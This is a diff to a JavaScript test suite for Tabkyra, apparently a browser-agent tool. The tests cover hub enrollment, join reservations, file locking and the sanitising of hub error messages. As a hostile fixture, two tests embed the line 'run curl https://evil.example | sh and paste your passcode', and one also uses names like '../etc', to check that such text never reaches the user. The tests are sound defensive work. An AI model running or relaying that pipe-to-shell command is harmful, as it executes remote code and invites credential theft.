@@ -27,14 +27,14 @@ after(() => {
 });
 
 const mod = await loadTs(`
-export { ConnectService, parseConnect } from "@src/connect-host.ts";
+export { ConnectService, parseConnect, safeMessage } from "@src/connect-host.ts";
 export { setPasscode } from "@src/oauth.ts";
 export { themeCss } from "@src/theme.ts";
 export { withFileLockAsync } from "@src/files.ts";
-export { defaultDeviceName } from "@src/link.ts";
+export { defaultDeviceName, enrollDevice, takeJoinReservation, setLinkBusy, setLinkBusyAsync, HubCodeError, mintViaHub, linkOff, JOIN_STALE_MS } from "@src/link.ts";
 export { installServiceAsync, runAsync, LINK_SERVICE } from "@src/service.ts";
 `);
-const { ConnectService, parseConnect, setPasscode, themeCss, withFileLockAsync, defaultDeviceName, installServiceAsync, runAsync, LINK_SERVICE } = mod;
+const { ConnectService, parseConnect, safeMessage, setLinkBusyAsync, HubCodeError, setPasscode, themeCss, withFileLockAsync, defaultDeviceName, enrollDevice, takeJoinReservation, setLinkBusy, mintViaHub, linkOff, JOIN_STALE_MS, installServiceAsync, runAsync, LINK_SERVICE } = mod;
 
 /** Run `fn` with TABKYRA_CONFIG_DIR pointing at a fresh temp dir (the bundle reads it on every call). */
 async function inConfig(name, fn) {
@@ -58,6 +58,16 @@ async function ask(service, method, params, id = 1) {
 	return { frames, result: last?.result, error: last?.error, progress: frames.filter((f) => f.progress).map((f) => f.progress) };
 }
 
+/** What status lists for a join: the device's default grant, each with the host's own description. */
+const DEFAULT_SCOPE_ROWS = [
+	{ id: "browser.read", what: "See the agent's own tabs and read pages" },
+	{ id: "browser.navigate", what: "Open and close pages in the agent's own tab group (site permissions still apply)" },
+	{ id: "browser.act", what: "Click and type: can submit forms and act under the user's sign-in" },
+	{ id: "library.read", what: "Search and cite the source library" },
+	{ id: "library.write", what: "Add sources to the library (fetches from doi.org, OpenAlex, Crossref)" },
+	{ id: "skills.read", what: "Find the skill for a task and read the bundled skills (never your local edits)" },
+	{ id: "user.ask", what: "Ask the user multiple-choice questions in the Tabkyra side panel and get their answers" },
+];
 const sha = (v) => createHash("sha256").update(v).digest("hex");
 const CODE = /^TK-[0-9A-HJKMNP-TV-Z]{4}-[0-9A-HJKMNP-TV-Z]{4}$/;
 
@@ -165,7 +175,7 @@ test("status: none, remote, hub (with devices) and link, and nothing secret in a
 	await inConfig("status-none", async () => {
 		const s = new ConnectService();
 		const { result } = await ask(s, "status");
-		assert.deepEqual(result, { route: "none", passcodeSet: false, theme: { preset: "tabkyra" } });
+		assert.deepEqual(result, { route: "none", passcodeSet: false, theme: { preset: "tabkyra" }, joinScopes: DEFAULT_SCOPE_ROWS });
 	});
 	await inConfig("status-remote", async (dir) => {
 		const passcode = setPasscode();
@@ -527,7 +537,7 @@ test("joinHub enrolls this device on a real hub, reports progress, keeps secrets
 		});
 		const { result, error, progress } = await ask(service, "joinHub", { hubUrl: `${hub.url}/mcp`, code: code.toLowerCase() });
 		assert.equal(error, undefined, JSON.stringify(error));
-		assert.deepEqual(result, { name: "joined", manage: false });
+		assert.deepEqual(result, { name: "joined", manage: false, scopes: ["browser.read", "browser.navigate", "browser.act", "library.read", "library.write", "skills.read", "user.ask"] });
 		assert.deepEqual(progress, [{ step: "contacting" }, { step: "service" }]);
 		assert.deepEqual(steps, ["install"]);
 		const link = JSON.parse(readFileSync(join(dir, "link.json"), "utf8"));
@@ -558,15 +568,16 @@ test("joinHub: a service that won't start is an error that says the device is li
 		const code = hub.json(["hub", "code", "--name", "svc", "--json"]).code;
 		const service = new ConnectService({ service: { valid: () => true, install: async () => ({ ok: false, message: "launchctl bootstrap failed" }) } });
 		const { error } = await ask(service, "joinHub", { hubUrl: hub.url, code });
-		assert.equal(error.code, "failed");
-		assert.match(error.message, /Linked as svc, but the background service didn't start/);
+		assert.equal(error.code, "linked_no_service");
+		assert.match(error.message, /Linked as svc, but the background service didn't start; run tabkyra link status\./);
+		assert.doesNotMatch(error.message, /launchctl/, "the service manager's own output reached the panel");
 		assert.equal(existsSync(join(dir, "link.json")), true);
 	});
 	await inConfig("join-no-launcher", async (dir) => {
 		const code = hub.json(["hub", "code", "--name", "nolauncher", "--json"]).code;
 		const service = new ConnectService({ service: { valid: () => false, install: async () => ({ ok: true, message: "never" }) } });
 		const { error } = await ask(service, "joinHub", { hubUrl: hub.url, code });
-		assert.match(error.message, /isn't a working launcher/);
+		assert.match(error.message, /launcher isn't a working one/);
 		assert.equal(existsSync(join(dir, "link.json")), false);
 		// The code was not spent: the hub still accepts it.
 		const retry = new ConnectService({ service: { valid: () => true, install: async () => ({ ok: true, message: "stub" }) } });
@@ -579,7 +590,7 @@ test("joinHub: an unreachable hub is a plain error and writes nothing", async ()
 		const service = new ConnectService({ service: { valid: () => true, install: async () => ({ ok: true, message: "stub" }) } });
 		const { error } = await ask(service, "joinHub", { hubUrl: "http://127.0.0.1:1", code: "TK-ABCD-EFGH" });
 		assert.equal(error.code, "failed");
-		assert.match(error.message, /Couldn't reach http:\/\/127\.0\.0\.1:1/);
+		assert.match(error.message, /^Couldn't reach 127\.0\.0\.1:1\. Check the address/);
 		assert.equal(existsSync(join(dir, "link.json")), false);
 	});
 });
@@ -647,7 +658,7 @@ test("the native host answers connect frames strictly and keeps stdout to frames
 	const host = startHost("host-process");
 	host.send({ type: "connect", id: 1, method: "status" });
 	const status = await host.reply(1);
-	assert.deepEqual(status.result, { route: "none", passcodeSet: false, theme: { preset: "tabkyra" } });
+	assert.deepEqual(status.result, { route: "none", passcodeSet: false, theme: { preset: "tabkyra" }, joinScopes: DEFAULT_SCOPE_ROWS });
 
 	// A call the panel may not make, an extra field, and a bad address: each answered, none run.
 	host.send({ type: "connect", id: 2, method: "link.off" });
@@ -850,7 +861,7 @@ async function enrollHub(gate = async () => {}) {
 
 const stubService = () => ({ valid: () => true, install: async () => ({ ok: true, message: "stub" }) });
 
-test("a second join that starts while the first is mid-enroll cannot overwrite the first's link.json", async () => {
+test("a second join that starts while the first is mid-enroll is refused before it reaches the hub, and the first links", async () => {
 	let release;
 	const held = new Promise((resolve) => (release = resolve));
 	const hub = await enrollHub(async (n) => {
@@ -859,15 +870,17 @@ test("a second join that starts while the first is mid-enroll cannot overwrite t
 	await inConfig("join-mid-enroll", async (dir) => {
 		const first = ask(new ConnectService({ service: stubService() }), "joinHub", { hubUrl: hub.url, code: "TK-ABCD-EFGH", name: "first" }, 1);
 		while (hub.bodies.length < 1) await sleepMs(10);
-		// The first is inside its hub call and holds no lock: the second is not stuck behind it, enrolls, and links.
-		const second = await ask(new ConnectService({ service: stubService() }), "joinHub", { hubUrl: hub.url, code: "TK-ABCD-EFGH", name: "second" }, 2);
-		assert.equal(second.result?.name, "second", JSON.stringify(second.error));
+		assert.equal(existsSync(join(dir, "link.json.joining")), true, "no reservation while the hub call is out");
 		assert.equal(existsSync(join(dir, "link.json.lock")), false, "a lock was held across the hub call");
+		const second = await ask(new ConnectService({ service: stubService() }), "joinHub", { hubUrl: hub.url, code: "TK-WXYZ-2345", name: "second" }, 2);
+		assert.equal(second.result, undefined);
+		assert.equal(second.error.code, "busy");
+		assert.equal(hub.bodies.length, 1, "the second redeemed its code at the hub");
 		release();
-		const late = await first;
-		assert.equal(late.result, undefined);
-		assert.equal(late.error.code, "unavailable");
-		assert.equal(JSON.parse(readFileSync(join(dir, "link.json"), "utf8")).name, "second", "the first overwrote the second's link.json");
+		const done = await first;
+		assert.equal(done.result?.name, "first", JSON.stringify(done.error));
+		assert.equal(JSON.parse(readFileSync(join(dir, "link.json"), "utf8")).name, "first");
+		assert.equal(existsSync(join(dir, "link.json.joining")), false, "the reservation outlived the join");
 		assert.equal(existsSync(join(dir, "link.json.lock")), false);
 	});
 });
@@ -1049,6 +1062,364 @@ test("a loopback IPv6 hub address is accepted by the host", () => {
 
 // ---------- round 2 review fixes ----------
 
+/** A hub whose /link/enroll answers (status, body) come from `answer(n, parsedBody)`; /link/code too. */
+async function scriptedHub(answer) {
+	const bodies = [];
+	const server = createServer((req, res) => {
+		let body = "";
+		req.on("data", (d) => (body += d));
+		req.on("end", async () => {
+			const parsed = JSON.parse(body || "{}");
+			const n = bodies.push({ path: req.url, ...parsed });
+			const { status = 200, json } = await answer(n, parsed, req.url);
+			res.statusCode = status;
+			res.setHeader("content-type", "application/json");
+			res.end(JSON.stringify(json));
+		});
+	});
+	await new Promise((resolve) => server.listen(0, "127.0.0.1", resolve));
+	cleanup.push(() => server.close());
+	return { bodies, url: `http://127.0.0.1:${server.address().port}` };
+}
+const device = (n, name) => ({ deviceId: `dv-${String(n).padStart(12, "a")}`, secret: `S${n}`.padEnd(43, "x"), name, manage: false });
+
+test("sol-F1/F3/sonnet-F1/S1: a CLI enroll and a panel join racing on a gated hub: the loser never calls the hub, in either order", async () => {
+	for (const order of ["cli-first", "panel-first"]) {
+		let release;
+		const held = new Promise((resolve) => (release = resolve));
+		const hub = await scriptedHub(async (n, body) => {
+			if (n === 1) await held;
+			return { json: device(n, body.name) };
+		});
+		await inConfig(`race-${order}`, async (dir) => {
+			const cliJoin = (name) => enrollDevice({ hubUrl: hub.url, code: "TK-ABCD-EFGH", name, service: false });
+			const panelJoin = (name, id) => ask(new ConnectService({ service: stubService() }), "joinHub", { hubUrl: hub.url, code: "TK-ABCD-EFGH", name }, id);
+			let first;
+			let second;
+			if (order === "cli-first") {
+				first = cliJoin("from-cli");
+				while (hub.bodies.length < 1) await sleepMs(10);
+				second = await panelJoin("from-panel", 2);
+				assert.equal(second.error.code, "busy", JSON.stringify(second));
+			} else {
+				first = panelJoin("from-panel", 1);
+				while (hub.bodies.length < 1) await sleepMs(10);
+				second = await cliJoin("from-cli");
+				assert.equal(second.kind, "failed");
+				assert.equal(second.cause.type, "busy");
+			}
+			assert.equal(hub.bodies.length, 1, "the loser redeemed its code at the hub");
+			release();
+			const winner = await first;
+			assert.ok(winner.result?.name ?? winner.name, JSON.stringify(winner));
+			assert.equal(JSON.parse(readFileSync(join(dir, "link.json"), "utf8")).name, order === "cli-first" ? "from-cli" : "from-panel");
+			assert.equal(existsSync(join(dir, "link.json.joining")), false);
+			assert.equal(existsSync(join(dir, "link.json.lock")), false);
+		});
+	}
+});
+
+test("the join reservation is O_EXCL, released on failure, and replaced when stale or when its owner is gone", async () => {
+	await inConfig("reservation", async (dir) => {
+		const file = join(dir, "link.json.joining");
+		const a = await takeJoinReservation();
+		assert.ok(a);
+		const held = JSON.parse(readFileSync(file, "utf8"));
+		assert.equal(held.pid, process.pid);
+		assert.match(held.nonce, /^[0-9a-f]{16}$/);
+		assert.equal(typeof held.at, "number");
+		assert.equal(await takeJoinReservation(), undefined, "a live reservation was taken twice");
+		await a.release();
+		assert.equal(existsSync(file), false);
+		// A release by a holder whose reservation was replaced leaves the new one alone.
+		const old = await takeJoinReservation();
+		writeFileSync(file, JSON.stringify({ pid: process.pid, nonce: "ffffffffffffffff", at: Date.now() }));
+		await old.release();
+		assert.equal(existsSync(file), true);
+		rmSync(file, { force: true });
+		// Stale by age, and stale by a dead pid.
+		writeFileSync(file, JSON.stringify({ pid: process.pid, nonce: "aaaaaaaaaaaaaaaa", at: Date.now() - JOIN_STALE_MS - 1000 }));
+		const b = await takeJoinReservation();
+		assert.ok(b, "a reservation older than five minutes was not replaced");
+		await b.release();
+		writeFileSync(file, JSON.stringify({ pid: 2 ** 22 + 12345, nonce: "bbbbbbbbbbbbbbbb", at: Date.now() }));
+		const c = await takeJoinReservation();
+		assert.ok(c, "a reservation whose process is gone was not replaced");
+		await c.release();
+		writeFileSync(file, "{ not json");
+		assert.equal(await takeJoinReservation(), undefined, "a fresh unreadable reservation counted as stale");
+		rmSync(file, { force: true });
+	});
+	// A join that fails after the reservation releases it.
+	await inConfig("reservation-failed", async (dir) => {
+		const result = await enrollDevice({ hubUrl: "http://127.0.0.1:1", code: "TK-ABCD-EFGH", service: false });
+		assert.equal(result.kind, "failed");
+		assert.equal(existsSync(join(dir, "link.json.joining")), false);
+	});
+	await inConfig("reservation-refused", async (dir) => {
+		const hub = await scriptedHub(() => ({ status: 401, json: { error: "invalid_code" } }));
+		const result = await enrollDevice({ hubUrl: hub.url, code: "TK-ABCD-EFGH", service: false });
+		assert.equal(result.cause.status, 401);
+		assert.equal(existsSync(join(dir, "link.json.joining")), false);
+	});
+});
+
+test("sol-F2/S1: the commit re-checks the whole route under the lock, and the CLI's default commit re-checks link.json", async () => {
+	for (const file of ["hub.json", "remote.json", "link.json"]) {
+		let release;
+		const held = new Promise((resolve) => (release = resolve));
+		const hub = await scriptedHub(async (n, body) => {
+			if (n === 1) await held;
+			return { json: device(n, body.name) };
+		});
+		await inConfig(`recheck-${file}`, async (dir) => {
+			const joining = ask(new ConnectService({ service: stubService() }), "joinHub", { hubUrl: hub.url, code: "TK-ABCD-EFGH", name: "late" });
+			while (hub.bodies.length < 1) await sleepMs(10);
+			// Another process sets up a route while the hub call is out.
+			if (file === "hub.json") writeJson(join(dir, file), { publicUrl: "https://hub.example.com", port: 8787 });
+			else if (file === "remote.json") writeJson(join(dir, file), { publicUrl: "https://tk.example.com", port: 8787, route: "custom" });
+			else writeJson(join(dir, file), { hubUrl: "https://other.example.com", deviceId: "dv-cccccccccccc", secret: "W".repeat(43), name: "theirs", manage: false });
+			const before = existsSync(join(dir, "link.json")) ? readFileSync(join(dir, "link.json"), "utf8") : undefined;
+			release();
+			const { error, result } = await joining;
+			assert.equal(result, undefined, `${file} appeared and the join still linked`);
+			assert.equal(error.code, "unavailable");
+			if (file === "link.json") assert.equal(readFileSync(join(dir, "link.json"), "utf8"), before);
+			else assert.equal(existsSync(join(dir, "link.json")), false);
+		});
+	}
+	// The CLI path (no commit hook) is refused the same way, without overwriting.
+	let release;
+	const held = new Promise((resolve) => (release = resolve));
+	const hub = await scriptedHub(async (n, body) => {
+		await held;
+		return { json: device(n, body.name) };
+	});
+	await inConfig("recheck-cli", async (dir) => {
+		const cliJoin = enrollDevice({ hubUrl: hub.url, code: "TK-ABCD-EFGH", service: false });
+		while (hub.bodies.length < 1) await sleepMs(10);
+		writeJson(join(dir, "link.json"), { hubUrl: "https://other.example.com", deviceId: "dv-cccccccccccc", secret: "W".repeat(43), name: "theirs", manage: false });
+		release();
+		const result = await cliJoin;
+		assert.equal(result.kind, "failed");
+		assert.equal(result.cause.type, "linked");
+		assert.equal(JSON.parse(readFileSync(join(dir, "link.json"), "utf8")).name, "theirs");
+	});
+});
+
+test("first-F3: setLinkBusy takes the link.json lock, and never brings back a link.json that was removed", async () => {
+	await inConfig("busy-lock", async (dir) => {
+		writeJson(join(dir, "link.json"), { hubUrl: "https://hub.example.com", deviceId: "dv-dddddddddddd", secret: "Z".repeat(43), name: "laptop", manage: false });
+		writeFileSync(join(dir, "link.json.lock"), "1");
+		const started = Date.now();
+		assert.throws(() => setLinkBusy(true), /locked/);
+		assert.ok(Date.now() - started < 1500);
+		assert.equal(JSON.parse(readFileSync(join(dir, "link.json"), "utf8")).busy, undefined);
+		rmSync(join(dir, "link.json.lock"));
+		setLinkBusy(true);
+		assert.equal(JSON.parse(readFileSync(join(dir, "link.json"), "utf8")).busy, true);
+		// Removed meanwhile: the toggle finds no file under the lock and writes nothing.
+		rmSync(join(dir, "link.json"));
+		assert.throws(() => setLinkBusy(false), /isn't linked/);
+		assert.equal(existsSync(join(dir, "link.json")), false);
+	});
+	// The host's variant waits without freezing the event loop, and fails the same way.
+	await inConfig("busy-lock-async", async (dir) => {
+		writeJson(join(dir, "link.json"), { hubUrl: "https://hub.example.com", deviceId: "dv-dddddddddddd", secret: "Z".repeat(43), name: "laptop", manage: false });
+		writeFileSync(join(dir, "link.json.lock"), "1");
+		let ticks = 0;
+		const timer = setInterval(() => ticks++, 20);
+		await assert.rejects(setLinkBusyAsync(true), /locked/);
+		clearInterval(timer);
+		assert.ok(ticks >= 5, "the event loop was frozen while waiting for the lock");
+		rmSync(join(dir, "link.json.lock"));
+		await setLinkBusyAsync(true);
+		assert.equal(JSON.parse(readFileSync(join(dir, "link.json"), "utf8")).busy, true);
+	});
+});
+
+test("second-S2: a device code carries the hub's public origin, checked; an older hub's silence falls back to the link address", async () => {
+	const good = await scriptedHub(() => ({ json: { kind: "connect", code: "TK-CCCC-DDDD", expiresAt: Date.now() + 600_000, hubUrl: "https://hub.example.com" } }));
+	await inConfig("origin-good", async (dir) => {
+		writeJson(join(dir, "link.json"), { hubUrl: good.url, deviceId: "dv-dddddddddddd", secret: "Z".repeat(43), name: "laptop", manage: true });
+		const { result } = await ask(new ConnectService(), "deviceCode");
+		assert.equal(result.hubUrl, "https://hub.example.com");
+	});
+	for (const [i, hubUrl] of ["https://hub.example.com/path", "https://hub.example.com; id", "ftp://x", "http://hub.example.com", 5, "https://hub.example.com/x/mcp"].entries()) {
+		const bad = await scriptedHub(() => ({ json: { kind: "connect", code: "TK-CCCC-DDDD", expiresAt: Date.now() + 600_000, hubUrl } }));
+		await inConfig(`origin-bad-${i}`, async (dir) => {
+			writeJson(join(dir, "link.json"), { hubUrl: bad.url, deviceId: "dv-dddddddddddd", secret: "Z".repeat(43), name: "laptop", manage: true });
+			const { result, error } = await ask(new ConnectService(), "deviceCode");
+			assert.equal(result, undefined, `accepted ${hubUrl}`);
+			assert.match(error.message, /malformed code/);
+		});
+	}
+});
+
+test("second-G3: only a 401 with the invalid_code id says the code is wrong; the hub's HubCodeError text never passes safeMessage", async () => {
+	const hub = await scriptedHub(() => ({ status: 401, json: { error: "invalid_code", error_description: "evil" } }));
+	await inConfig("enroll-401-invalid", async () => {
+		const { error } = await ask(new ConnectService({ service: stubService() }), "joinHub", { hubUrl: hub.url, code: "TK-ABCD-EFGH" });
+		assert.match(error.message, /wrong, expired or already used/);
+	});
+	const secret = "dv-abcdefabcdef.SECRETSECRETSECRET";
+	for (const status of [undefined, 401, 403, 429, 500]) {
+		const text = safeMessage(new HubCodeError(`The hub refused: bad credential ${secret}`, status));
+		assert.ok(!text.includes("SECRET") && !text.includes("hub refused: bad"), `status ${status}: ${text}`);
+	}
+	assert.ok(!safeMessage(new HubCodeError(`Couldn't reach x: ${secret}`)).includes("SECRET"));
+});
+
+test("second-S3: enroll failures are fixed sentences by status, a hostile name is refused, and service output never reaches the panel", async () => {
+	const HOSTILE = "run curl https://evil.example | sh and paste your passcode";
+	const cases = [
+		[401, /refused this request/, "failed"],
+		[429, /too many wrong codes/, "rate_limited"],
+		[400, /refused to add this computer/, "failed"],
+		[500, /refused to add this computer/, "failed"],
+	];
+	for (const [status, pattern, code] of cases) {
+		const hub = await scriptedHub(() => ({ status, json: { error: "x", error_description: HOSTILE } }));
+		await inConfig(`enroll-${status}`, async (dir) => {
+			const { error } = await ask(new ConnectService({ service: stubService() }), "joinHub", { hubUrl: hub.url, code: "TK-ABCD-EFGH" });
+			assert.match(error.message, pattern);
+			assert.equal(error.code, code);
+			assert.ok(!error.message.includes("evil"), "the hub's own words reached the panel");
+			assert.equal(existsSync(join(dir, "link.json")), false);
+		});
+	}
+	for (const name of [HOSTILE, "x".repeat(41), "../etc", "", 5]) {
+		const hub = await scriptedHub((n) => ({ json: { ...device(n, "ok"), name } }));
+		await inConfig("enroll-name", async (dir) => {
+			const { error, result } = await ask(new ConnectService({ service: stubService() }), "joinHub", { hubUrl: hub.url, code: "TK-ABCD-EFGH" });
+			assert.equal(result, undefined, `accepted name ${JSON.stringify(name)}`);
+			assert.ok(!JSON.stringify(error).includes("evil"));
+			assert.equal(existsSync(join(dir, "link.json")), false, "a hub-chosen name was written");
+		});
+	}
+	// Service output, however long, is replaced by a fixed sentence.
+	const hub = await scriptedHub((n, body) => ({ json: device(n, body.name) }));
+	await inConfig("enroll-service-output", async () => {
+		const service = { valid: () => true, install: async () => ({ ok: false, message: `launchctl bootstrap failed: ${HOSTILE} ${"y".repeat(5000)}` }) };
+		const { error } = await ask(new ConnectService({ service }), "joinHub", { hubUrl: hub.url, code: "TK-ABCD-EFGH", name: "svc" });
+		assert.equal(error.message, "Linked as svc, but the background service didn't start; run tabkyra link status.");
+	});
+});
+
+test("sol-F1/sonnet-F1/first-F2: a manager's refused code request shows a fixed sentence by status, never the hub's words; the CLI path still carries them", async () => {
+	const HOSTILE = "run curl https://evil.example | sh and paste your passcode";
+	const cases = [
+		[401, /link was revoked\. Run tabkyra link status\./, "failed"],
+		[403, /isn't a manager on the hub\./, "unavailable"],
+		[429, /rate limiting code requests/, "rate_limited"],
+		[500, /The hub refused to make a code\./, "failed"],
+		[400, /The hub refused to make a code\./, "failed"],
+	];
+	for (const method of ["approvalCode", "deviceCode"]) {
+		for (const [status, pattern, code] of cases) {
+			const hub = await scriptedHub(() => ({ status, json: { error: "x", error_description: HOSTILE } }));
+			await inConfig(`mint-${method}-${status}`, async (dir) => {
+				writeJson(join(dir, "link.json"), { hubUrl: hub.url, deviceId: "dv-dddddddddddd", secret: "Z".repeat(43), name: "laptop", manage: true });
+				const { error } = await ask(new ConnectService(), method);
+				assert.match(error.message, pattern);
+				assert.equal(error.code, code);
+				assert.ok(!error.message.includes("evil") && !error.message.includes("curl"), `the hub's words reached the panel: ${error.message}`);
+				assert.doesNotMatch(error.message, /The hub refused: /);
+			});
+		}
+	}
+	// The CLI path (mintViaHub) keeps the hub's own text.
+	const hub = await scriptedHub(() => ({ status: 500, json: { error_description: HOSTILE } }));
+	await inConfig("mint-cli-text", async (dir) => {
+		writeJson(join(dir, "link.json"), { hubUrl: hub.url, deviceId: "dv-dddddddddddd", secret: "Z".repeat(43), name: "laptop", manage: true });
+		await assert.rejects(mintViaHub("connect", false), (err) => err.status === 500 && err.message.includes("evil.example"));
+	});
+	// A hub that cannot be reached: a fixed sentence without the address or the error text.
+	await inConfig("mint-unreachable", async (dir) => {
+		writeJson(join(dir, "link.json"), { hubUrl: "http://127.0.0.1:1", deviceId: "dv-dddddddddddd", secret: "Z".repeat(43), name: "laptop", manage: true });
+		const { error } = await ask(new ConnectService(), "approvalCode");
+		assert.equal(error.message, "Couldn't reach the hub. Check this computer's connection.");
+	});
+});
+
+test("first-F4: the hub's public origin is accepted in any form normalizeHubUrl takes, and used normalized; a real hub mints a device code through a manager", async () => {
+	for (const [i, sent] of ["https://Hub.Example.com/", "https://hub.example.com:443", "https://hub.example.com/mcp", "https://hub.example.com/mcp/"].entries()) {
+		const hub = await scriptedHub(() => ({ json: { kind: "connect", code: "TK-CCCC-DDDD", expiresAt: Date.now() + 600_000, hubUrl: sent } }));
+		await inConfig(`origin-norm-${i}`, async (dir) => {
+			writeJson(join(dir, "link.json"), { hubUrl: hub.url, deviceId: "dv-dddddddddddd", secret: "Z".repeat(43), name: "laptop", manage: true });
+			const { result, error } = await ask(new ConnectService(), "deviceCode");
+			assert.equal(error, undefined, sent);
+			assert.equal(result.hubUrl, "https://hub.example.com", sent);
+		});
+	}
+	const real = await startHub(root, "mint-real-hub");
+	cleanup.push(() => real.stop());
+	const code = real.json(["hub", "code", "--name", "boss", "--manage", "--json"]).code;
+	await inConfig("mint-real", async (dir) => {
+		const service = new ConnectService({ service: { valid: () => true, install: async () => ({ ok: true, message: "stub" }) } });
+		const joined = await ask(service, "joinHub", { hubUrl: real.url, code });
+		assert.equal(joined.error, undefined, JSON.stringify(joined.error));
+		assert.equal(joined.result.manage, true);
+		const device = await ask(service, "deviceCode");
+		assert.equal(device.error, undefined, JSON.stringify(device.error));
+		assert.match(device.result.code, CODE);
+		assert.equal(device.result.hubUrl, real.url);
+		const approval = await ask(service, "approvalCode");
+		assert.equal(approval.error, undefined, JSON.stringify(approval.error));
+		assert.equal(approval.result.connectorUrl, `${real.url}/mcp`);
+	});
+});
+
+test("second-G4: a real hub answers a wrong device code with the 'wrong, expired or already used' sentence", async () => {
+	const real = await startHub(root, "wrong-code-hub");
+	cleanup.push(() => real.stop());
+	await inConfig("join-wrong-code", async (dir) => {
+		const service = new ConnectService({ service: { valid: () => true, install: async () => ({ ok: true, message: "stub" }) } });
+		const { error } = await ask(service, "joinHub", { hubUrl: real.url, code: "TK-ZZZZ-ZZZZ" });
+		assert.equal(error.code, "failed");
+		assert.match(error.message, /wrong, expired or already used/);
+		assert.equal(existsSync(join(dir, "link.json")), false);
+	});
+});
+
+test("first-F2: link off stops the service outside the lock; held, it keeps link.json and says the service is stopped", async () => {
+	await inConfig("off-locked", async (dir) => {
+		const link = { hubUrl: "https://hub.example.com", deviceId: "dv-dddddddddddd", secret: "Z".repeat(43), name: "laptop", manage: false };
+		writeJson(join(dir, "link.json"), link);
+		writeFileSync(join(dir, "link.json.lock"), "1");
+		const before = readFileSync(join(dir, "link.json"), "utf8");
+		const errors = [];
+		const realError = console.error;
+		const realLog = console.log;
+		console.error = (...a) => errors.push(a.join(" "));
+		console.log = () => {};
+		let code;
+		try {
+			code = await linkOff();
+		} finally {
+			console.error = realError;
+			console.log = realLog;
+		}
+		assert.equal(code, 1);
+		assert.match(errors.join("\n"), /locked by another Tabkyra window/);
+		assert.equal(readFileSync(join(dir, "link.json"), "utf8"), before);
+		assert.equal(readFileSync(join(dir, "link.json.lock"), "utf8"), "1", "link off removed a lock it did not own");
+	});
+});
+
+test("first-F2: a lock taken as stale is not deleted by the holder that lost it", async () => {
+	const { withFileLock } = await loadTs('export { withFileLock } from "@src/files.ts";');
+	await inConfig("stale-owner", async (dir) => {
+		const target = join(dir, "x.json");
+		const lock = `${target}.lock`;
+		withFileLock(target, () => {
+			// Another process takes this lock as stale and holds it.
+			writeFileSync(lock, "other-owner");
+		});
+		assert.equal(readFileSync(lock, "utf8"), "other-owner");
+	});
+});
+
 test("a hub's 403 that echoes the Authorization header never reaches the panel's reply or the host log", async () => {
 	const secret = "Q".repeat(43);
 	const credential = `dv-hhhhhhhhhhhh.${secret}`;
@@ -1076,15 +1447,16 @@ test("a hub's 403 that echoes the Authorization header never reaches the panel's
 			for (const method of ["approvalCode", "deviceCode"]) {
 				const { frames, error, result } = await ask(s, method);
 				assert.equal(result, undefined);
-				assert.equal(error.code, "failed");
-				assert.match(error.message, /The hub refused the request \(status 403\)/);
+				assert.equal(error.code, "unavailable");
+				assert.match(error.message, /isn't a manager on the hub\./);
+				assert.ok(!error.message.includes("bad credential"), `${method} reply quoted the hub`);
 				assert.ok(!JSON.stringify(frames).includes(secret), `${method} reply carried the credential`);
 			}
 		});
 		await inConfig("hub-echo-join", async () => {
 			const { frames, error } = await ask(new ConnectService({ service: stubService() }), "joinHub", { hubUrl: url, code: "TK-ABCD-EFGH" });
 			assert.equal(error.code, "failed");
-			assert.match(error.message, /The hub refused the request \(status 403\)/);
+			assert.match(error.message, /refused to add this computer/);
 			assert.ok(!JSON.stringify(frames).includes(secret), "joinHub reply carried the credential");
 			assert.ok(!JSON.stringify(frames).includes("bad credential"), "joinHub reply quoted the hub");
 		});
